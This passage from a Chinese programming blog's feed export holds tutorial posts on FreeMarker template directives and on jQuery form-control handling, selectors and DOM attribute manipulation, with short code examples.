<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">First name: $&#123;firstName?html&#125;  </span><br><span class="line">Last name: $&#123;lastName &#125;  </span><br><span class="line">Maiden name: $&#123;maidenName?html&#125;  </span><br></pre></td></tr></table></figure>
<h3 id="assign"><a href="#assign" class="headerlink" title="assign"></a>assign</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">#assign name=value&gt;  </span></span><br><span class="line"></span><br><span class="line">&lt;#-- 或则 --&gt;  </span><br><span class="line"></span><br><span class="line">&lt;<span class="meta">#assign name1=value1 name2=value2 ... nameN=valueN&gt;  </span></span><br><span class="line"></span><br><span class="line">&lt;#-- 或则 --&gt;  </span><br><span class="line"></span><br><span class="line">&lt;<span class="meta">#assign same as above... in namespacehash&gt;  </span></span><br><span class="line"></span><br><span class="line">&lt;#-- 或则 --&gt;  </span><br><span class="line"></span><br><span class="line">&lt;<span class="meta">#assign name&gt;  </span></span><br><span class="line">  capture <span class="keyword">this</span>  </span><br><span class="line">&lt;/<span class="meta">#assign&gt;  </span></span><br><span class="line"></span><br><span class="line">&lt;#-- 或则 --&gt;  </span><br><span class="line"></span><br><span class="line">&lt;<span class="meta">#assign name in namespacehash&gt;  </span></span><br><span class="line">  capture <span class="keyword">this</span>  </span><br><span class="line">&lt;/<span class="meta">#assign&gt;  </span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>生成变量,并且给变量赋值</p>
</blockquote>
<h3 id="global"><a href="#global" class="headerlink" title="global"></a>global</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">#global name=value&gt;  </span></span><br><span class="line">&lt;#--或则--&gt;  </span><br><span class="line">&lt;<span class="meta">#global name1=value1 name2=value2 ... nameN=valueN&gt;  </span></span><br><span class="line">&lt;#--或则--&gt;  </span><br><span class="line">&lt;<span class="meta">#global name&gt;  </span></span><br><span class="line">  capture <span class="keyword">this</span>  </span><br><span class="line">&lt;/<span class="meta">#global&gt;  </span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>全局赋值语法，利用这个语法给变量赋值，那么这个变量在所有的namespace [A1] 中是可见的, 如果这个变量被当前的assign 语法覆盖 如&lt;#global x=2&gt; &lt;#assign x=1&gt; 在当前页面里x=2 将被隐藏，或者通过${.global.x} 来访问</p>
</blockquote>
<h3 id="setting"><a href="#setting" class="headerlink" title="setting"></a>setting</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">#setting name=value&gt;  </span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>用来设置整个系统的一个环境<br>locale<br>number_format<br>boolean_format<br>date_format , time_format , datetime_format<br>time_zone<br>classic_compatible</p>
</blockquote>
<h3 id="macro-nested-return"><a href="#macro-nested-return" class="headerlink" title="macro, nested, return"></a>macro, nested, return</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">#macro name param1 param2 ... paramN&gt;  </span></span><br><span class="line">  ...  </span><br><span class="line">  &lt;<span class="meta">#nested loopvar1, loopvar2, ..., loopvarN&gt;  </span></span><br><span class="line">  ...  </span><br><span class="line">  &lt;<span class="meta">#return&gt;  </span></span><br><span class="line">  ...  </span><br><span class="line">&lt;/<span class="meta">#macro&gt;  </span></span><br></pre></td></tr></table></figure>
<h3 id="t-lt-rt"><a href="#t-lt-rt" class="headerlink" title="t, lt, rt"></a>t, lt, rt</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">#t&gt; 去掉左右空白和回车换行  </span></span><br><span class="line">&lt;<span class="meta">#lt&gt;去掉左边空白和回车换行  </span></span><br><span class="line">&lt;<span class="meta">#rt&gt;去掉右边空白和回车换行  </span></span><br><span class="line">&lt;<span class="meta">#nt&gt;取消上面的效果  </span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>大前端</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>freemarker</tag>
      </tags>
  </entry>
  <entry>
    <title>jQuery之checkbox|radio|select操作</title>
    <url>//jQuery-checkbox-radio-select</url>
    <content><![CDATA[<p>jQuery1.6中添加了prop方法,看起来和用起来都和attr方法一样,但是在一些特殊情况下,attribute和properties的区别非常大,在jQuery1.6之前，.attr()方法在获取一些attributes的时候使用了property值，这样会导致一些不一致的行为。在jQuery1.6中，.prop()方法提供了一中明确的获取property值得方式，这样.attr()方法仅返回attributes。 –摘自jQuery API文档</p>
<span id="more"></span>
<h2 id="checkbox"><a href="#checkbox" class="headerlink" title="checkbox"></a>checkbox</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;checkbox&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;1&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;checkbox&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;2&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;checkbox&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;3&#x27;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;input[type=checkbox]&quot;</span>)                    <span class="comment">//获取所有的checkbox</span></span><br><span class="line">$(<span class="string">&quot;input[type=checkbox]:checked&quot;</span>)            <span class="comment">//获取所有的被选中的checkbox</span></span><br><span class="line">$(<span class="string">&quot;input[type=checkbox]:not(:checked)&quot;</span>)      <span class="comment">//获取所有未被选中的checkbox</span></span><br><span class="line">$(<span class="string">&quot;input[type=checkbox]&quot;</span>).not(<span class="string">&quot;:checked&quot;</span>)    <span class="comment">//获取所有未被选中的checkbox</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;input[type=checkbox]:first&quot;</span>)              <span class="comment">//获取第一个checkbox的value值</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;input[type=checkbox]:checked&quot;</span>).length     <span class="comment">//获取被选中checkbox的数量</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;input[type=checkbox]:first&quot;</span>).prop(<span class="string">&quot;checked&quot;</span>)               <span class="comment">//判断第一个checkbox是否被选中</span></span><br><span class="line">$(<span class="string">&quot;input[type=checkbox]:first&quot;</span>).prop(<span class="string">&quot;checkbox&quot;</span>,<span class="literal">true</span>)         <span class="comment">//选中第一个checkbox</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;input[type=checkbox]:not(:checked)&quot;</span>).prop(<span class="string">&quot;checked&quot;</span>,<span class="literal">true</span>) <span class="comment">//全选</span></span><br><span class="line">$(<span class="string">&quot;input[type=checkbox]:checkbox&quot;</span>).prop(<span class="string">&quot;checked&quot;</span>,<span class="literal">false</span>)     <span class="comment">//都不选中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//反选</span></span><br><span class="line">$(<span class="string">&quot;input[type=checkbox]&quot;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($(<span class="built_in">this</span>).prop(<span class="string">&quot;checked&quot;</span>))&#123;</span><br><span class="line">        $(<span class="built_in">this</span>).prop(<span class="string">&quot;checked&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $(<span class="built_in">this</span>).prop(<span class="string">&quot;checked&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="radio"><a href="#radio" class="headerlink" title="radio"></a>radio</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;radio&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;rank&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;1&#x27;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;radio&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;rank&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;2&#x27;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;radio&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;rank&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;3&#x27;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;input[type=radio]&quot;</span>)                 <span class="comment">//获取所有的radio</span></span><br><span class="line">$(<span class="string">&quot;input[type=radio]:checked&quot;</span>)         <span class="comment">//获取被选中的radio</span></span><br><span class="line">$(<span class="string">&quot;input[type=radio]:not(:checkbox)&quot;</span>)  <span class="comment">//获取所有没有被选中的radio</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;input[type=radio]:checked&quot;</span>).val()   <span class="comment">//获取被选中的radio的value值</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;input[type=radio]:first&quot;</span>).prop(<span class="string">&quot;checked&quot;</span>)       <span class="comment">//判断第一个radio是否被选中</span></span><br><span class="line">$(<span class="string">&quot;input[type=radio]:first&quot;</span>).prop(<span class="string">&quot;checked&quot;</span>,<span class="literal">true</span>)  <span class="comment">//选中第一个radio</span></span><br></pre></td></tr></table></figure>
<h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;1&#x27;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;2&#x27;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;4&#x27;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;select option:selected&quot;</span>)        <span class="comment">//获取被选中的option</span></span><br><span class="line">$(<span class="string">&quot;select&quot;</span>).val()                  <span class="comment">//获取选中option的value值</span></span><br><span class="line">$(<span class="string">&quot;select option:selected&quot;</span>).text() <span class="comment">//获取被选中的option的text值</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;select option:first&quot;</span>).prop(<span class="string">&quot;selected&quot;</span>)           <span class="comment">//判断第一个option是否被选中</span></span><br><span class="line">$(<span class="string">&quot;select option:first&quot;</span>).prop(<span class="string">&quot;selected&quot;</span>,<span class="literal">true</span>)      <span class="comment">//选中第一个option</span></span><br><span class="line">$(<span class="string">&quot;select option:selected&quot;</span>).prop(<span class="string">&quot;selected&quot;</span>,<span class="literal">false</span>)  <span class="comment">//取消当前选中,然后默认选中第一个</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>大前端</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title>jQuery选择器与节点操作</title>
    <url>//jQuery-selector</url>
    <content><![CDATA[<p>jQuery 是一个 JavaScript 函数库。jQuery的语法设计使得许多操作变得容易，如操作文档对象（document）、选择文档对象模型（DOM）元素、创建动画效果、处理事件、以及开发Ajax程序。jQuery也提供了给开发人员在其上创建插件的能力。这使开发人员可以对底层交互与动画、高级效果和高级主题化的组件进行抽象化。</p>
<span id="more"></span>
<h2 id="jQuery获取元素"><a href="#jQuery获取元素" class="headerlink" title="jQuery获取元素"></a>jQuery获取元素</h2><h3 id="元素选择器"><a href="#元素选择器" class="headerlink" title="元素选择器"></a>元素选择器</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//元素选择器 &lt;div &gt;</span></span><br><span class="line">$(<span class="string">&quot;div&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="id选择器"><a href="#id选择器" class="headerlink" title="id选择器"></a>id选择器</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//id选择器 &lt;div id=&#x27;id&#x27;&gt;</span></span><br><span class="line">$(<span class="string">&quot;#id&quot;</span>) $(<span class="string">&quot;div#id&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="class选择器"><a href="#class选择器" class="headerlink" title="class选择器"></a>class选择器</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//class选择器 &lt;div class=&#x27;class&#x27;&gt;</span></span><br><span class="line">$(<span class="string">&quot;.class&quot;</span>) $(<span class="string">&quot;div.class&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="属性过滤选择器"><a href="#属性过滤选择器" class="headerlink" title="属性过滤选择器"></a>属性过滤选择器</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&#x27;check&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;li_01&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">type</span>=<span class="string">&#x27;li_02&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">type</span>=<span class="string">&#x27;li_03&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过属性获取 如果属性值为有特殊字符，一定要加引号</span></span><br><span class="line">$(<span class="string">&quot;[type]&quot;</span>)                  <span class="comment">//获取有type属性的元素</span></span><br><span class="line">$(<span class="string">&quot;[type=&#x27;li_01&#x27;]&quot;</span>)          <span class="comment">//获取type值等于&#x27;li_01&#x27;的元素</span></span><br><span class="line">$(<span class="string">&quot;[type!=&#x27;li_01&#x27;]&quot;</span>)         <span class="comment">//获取type值不等于&#x27;li_01&#x27;的元素</span></span><br><span class="line">$(<span class="string">&quot;[type*=&#x27;li&#x27;]&quot;</span>)            <span class="comment">//模糊匹配 获取type值包含&#x27;li&#x27;的元素</span></span><br><span class="line">$(<span class="string">&quot;[type^=&#x27;li&#x27;]&quot;</span>)            <span class="comment">//模糊匹配 获取type值以&#x27;li&#x27;开始的元素</span></span><br><span class="line">$(<span class="string">&quot;[type$=&#x27;01&#x27;]&quot;</span>)            <span class="comment">//模糊匹配 获取type值以&#x27;01&#x27;结尾的元素</span></span><br><span class="line">$(<span class="string">&quot;li[class=&#x27;check&#x27;][type]&quot;</span>) <span class="comment">//获取多个条件同时满足的元素</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="选择器"><a href="#选择器" class="headerlink" title="* 选择器"></a>* 选择器</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//遍历form下的所有元素,将其margin设置0</span></span><br><span class="line">$(<span class="string">&#x27;form *&#x27;</span>).css(<span class="string">&#x27;margin&#x27;</span>,<span class="string">&#x27;0px&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="并列选择器"><a href="#并列选择器" class="headerlink" title="并列选择器"></a>并列选择器</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;p, div&#x27;</span>).css(<span class="string">&#x27;color&#x27;</span>,<span class="string">&#x27;red&#x27;</span>); <span class="comment">//将p元素和div元素的字体颜色设置为red</span></span><br></pre></td></tr></table></figure>
<h3 id="层叠选择器"><a href="#层叠选择器" class="headerlink" title="层叠选择器"></a>层叠选择器</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;a&#x27;</span>&gt;</span>                  <span class="comment">&lt;!-- 父级div --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;a1&#x27;</span>&gt;</span>             <span class="comment">&lt;!-- 子级div1 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;a11&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  <span class="comment">&lt;!-- 孙级div1 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;a2&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>       <span class="comment">&lt;!-- 子级div2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;a3&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>       <span class="comment">&lt;!-- 子级div3 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>                <span class="comment">&lt;!-- 子级span1 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;.a div&quot;</span>)       <span class="comment">//选择class=a的元素下所有的div 即选择到子级div1,2,3 孙级div1</span></span><br><span class="line">$(<span class="string">&quot;.a &gt; div&quot;</span>)     <span class="comment">//选择class=a的元素的所有子div元素, 即选择到子级div1,2,3;</span></span><br><span class="line">$(<span class="string">&quot;div + span&quot;</span>)   <span class="comment">//选择所有的div元素的下一个input元素节点,即选择到:子级div3</span></span><br><span class="line">$(<span class="string">&quot;.a1 ~ div&quot;</span>)    <span class="comment">//同胞选择器,返回class为a2的标签元素的所有属于同一个父元素的div标签,即div1,2,3</span></span><br></pre></td></tr></table></figure>
<h3 id="基本过滤选择器"><a href="#基本过滤选择器" class="headerlink" title="基本过滤选择器"></a>基本过滤选择器</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;li:first&quot;</span>)     <span class="comment">//选择所有li元素的第一个</span></span><br><span class="line">$(<span class="string">&quot;li:last&quot;</span>)      <span class="comment">//选择所有li元素的最后一个</span></span><br><span class="line">$(<span class="string">&quot;li:even&quot;</span>)      <span class="comment">//选择所有li元素的第0,2,4... ...个元素(序号从0开始)</span></span><br><span class="line">$(<span class="string">&quot;li:odd&quot;</span>)       <span class="comment">//选择所有li元素的第1,3,5... ...个元素</span></span><br><span class="line">$(<span class="string">&quot;li:eq(2)&quot;</span>)     <span class="comment">//选择所有li元素中的第三个(即序号为2)</span></span><br><span class="line">$(<span class="string">&quot;li:gt(3)&quot;</span>)     <span class="comment">//选择所有li元素中序号大于3的li元素</span></span><br><span class="line">$(<span class="string">&quot;li:ll(2)&quot;</span>)     <span class="comment">//选择所有li元素中序号小于2的li元素</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;input[type=&#x27;checkbox&#x27;]:checked&quot;</span>)        <span class="comment">//获取所有已被选中的type等于checkbox的input元素</span></span><br><span class="line">$(<span class="string">&quot;input[type=&#x27;checkbox&#x27;]:not(:checked)&quot;</span>)  <span class="comment">//获取所有未被选中的type等于checkbox的input元素</span></span><br></pre></td></tr></table></figure>
<h3 id="内容过滤器"><a href="#内容过滤器" class="headerlink" title="内容过滤器"></a>内容过滤器</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;div:contains(&#x27;Faker&#x27;)&quot;</span>)     <span class="comment">//选择所有div中含有Faker文本的元素</span></span><br><span class="line">$(<span class="string">&quot;div:empty&quot;</span>)                 <span class="comment">//选择所有div中为空(不包含任何元素/文本)的元素</span></span><br><span class="line">$(<span class="string">&quot;div:has(&#x27;p&#x27;)&quot;</span>)              <span class="comment">//选择所有div中包含p元素的元素</span></span><br><span class="line">$(<span class="string">&quot;div:parent&quot;</span>)                <span class="comment">//选择所有的含有子元素或文本的div</span></span><br></pre></td></tr></table></figure>
<h3 id="可视化过滤器"><a href="#可视化过滤器" class="headerlink" title="可视化过滤器"></a>可视化过滤器</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;div:hidden&quot;</span>)            <span class="comment">//选择所有被hidden的div元素</span></span><br><span class="line">$(<span class="string">&quot;div:not(:hidden)&quot;</span>)      <span class="comment">//选择所有没有被hidden的div元素</span></span><br><span class="line">$(<span class="string">&quot;div:visible&quot;</span>)           <span class="comment">//所有可视化的div元素</span></span><br><span class="line">$(<span class="string">&quot;div:not(:visible)&quot;</span>)     <span class="comment">//所有非可视化的div元素</span></span><br></pre></td></tr></table></figure>
<h3 id="子元素过滤器"><a href="#子元素过滤器" class="headerlink" title="子元素过滤器"></a>子元素过滤器</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;d1&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;d11&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;d111&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;body div:first-child&quot;</span>)  <span class="comment">//返回所有的body元素下 所有div 为父元素的第一个元素 的元素.</span></span><br><span class="line"><span class="comment">//:first 与 :first-child 的区别用法</span></span><br><span class="line"><span class="comment">//$(&quot;body div:first&quot;)只匹配到第一个合适的元素 即只匹配到 d1</span></span><br><span class="line"><span class="comment">//$(&quot;body div:first-child&quot;) 匹配所有合适的元素:d1是body的第一个元素,d11是d1的第一个元素..</span></span><br><span class="line"><span class="comment">//所以匹配到d1,d11,d111</span></span><br><span class="line">$(<span class="string">&quot;div span:last-child&quot;</span>)   <span class="comment">//返回所有的body元素下 所有div 为父元素的最后一个元素 的元素.</span></span><br><span class="line"><span class="comment">//:last 与 :last-child 的区别参考first</span></span><br><span class="line">$(<span class="string">&quot;div button:only-child&quot;</span>) <span class="comment">//如果button是它父级元素的唯一子元素,此button将会被匹配</span></span><br></pre></td></tr></table></figure>
<h3 id="表单元素选择器"><a href="#表单元素选择器" class="headerlink" title="表单元素选择器"></a>表单元素选择器</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;:input&quot;</span>)    <span class="comment">//选择所有的表单输入元素，包括input, textarea, select 和 button</span></span><br><span class="line">$(<span class="string">&quot;:text&quot;</span>)     <span class="comment">//选择所有的text input元素</span></span><br><span class="line">$(<span class="string">&quot;:password&quot;</span>) <span class="comment">//选择所有的password input元素</span></span><br><span class="line">$(<span class="string">&quot;:radio&quot;</span>)    <span class="comment">//选择所有的radio input元素</span></span><br><span class="line">$(<span class="string">&quot;:checkbox&quot;</span>) <span class="comment">//选择所有的checkbox input元素</span></span><br><span class="line">$(<span class="string">&quot;:submit&quot;</span>)   <span class="comment">//选择所有的submit input元素</span></span><br><span class="line">$(<span class="string">&quot;:image&quot;</span>)    <span class="comment">//选择所有的image input元素</span></span><br><span class="line">$(<span class="string">&quot;:reset&quot;</span>)    <span class="comment">//选择所有的reset input元素</span></span><br><span class="line">$(<span class="string">&quot;:button&quot;</span>)   <span class="comment">//选择所有的button input元素</span></span><br><span class="line">$(<span class="string">&quot;:file&quot;</span>)     <span class="comment">//选择所有的file input元素</span></span><br><span class="line">$(<span class="string">&quot;:hidden&quot;</span>)   <span class="comment">//选择所有类型为hidden的input元素或表单的隐藏域</span></span><br></pre></td></tr></table></figure>
<h3 id="表单元素过滤器"><a href="#表单元素过滤器" class="headerlink" title="表单元素过滤器"></a>表单元素过滤器</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;:enabled&quot;</span>)               <span class="comment">//选择所有的可操作的表单元素</span></span><br><span class="line">$(<span class="string">&quot;:disabled&quot;</span>)              <span class="comment">//选择所有的不可操作的表单元素</span></span><br><span class="line">$(<span class="string">&quot;:checked&quot;</span>)               <span class="comment">//选择所有的被checked的表单元素</span></span><br><span class="line">$(<span class="string">&quot;select option:selected&quot;</span>) <span class="comment">//选择所有的select 的子元素中被selected的元素</span></span><br></pre></td></tr></table></figure>
<h2 id="节点操作"><a href="#节点操作" class="headerlink" title="节点操作"></a>节点操作</h2><h3 id="获取和操作节点属性"><a href="#获取和操作节点属性" class="headerlink" title="获取和操作节点属性"></a>获取和操作节点属性</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;index.html&#x27;</span> <span class="attr">data-type</span>=<span class="string">&#x27;a&#x27;</span> <span class="attr">style</span>=<span class="string">&quot;color:red;&quot;</span>&gt;</span>index<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&#x27;user&#x27;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;a&quot;</span>).attr(<span class="string">&quot;href&quot;</span>);               <span class="comment">//获取href属性值</span></span><br><span class="line">$(<span class="string">&quot;a&quot;</span>).attr(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;about.html&quot;</span>);  <span class="comment">//设置href属性值</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;a&quot;</span>).data(<span class="string">&quot;type&quot;</span>);               <span class="comment">//获取data-type属性值</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;a&quot;</span>).css(<span class="string">&quot;color&quot;</span>);               <span class="comment">//通过key(color/display/....)获取css值</span></span><br><span class="line">$(<span class="string">&quot;a&quot;</span>).css(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;black&quot;</span>);       <span class="comment">//通过key/value 设置css属性</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;a&quot;</span>).text();                     <span class="comment">//获取a的文本节点值</span></span><br><span class="line">$(<span class="string">&quot;a&quot;</span>).text(<span class="string">&quot;Index.html&quot;</span>);         <span class="comment">//设置a的文本节点值</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;input&quot;</span>).val();                  <span class="comment">//获取input的value值</span></span><br><span class="line">$(<span class="string">&quot;input&quot;</span>).val(<span class="string">&quot;username&quot;</span>);        <span class="comment">//设置input的value值</span></span><br></pre></td></tr></table></figure>
<h3 id="插入节点的方法"><a href="#插入节点的方法" class="headerlink" title="插入节点的方法"></a>插入节点的方法</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;head&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>Faker<span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
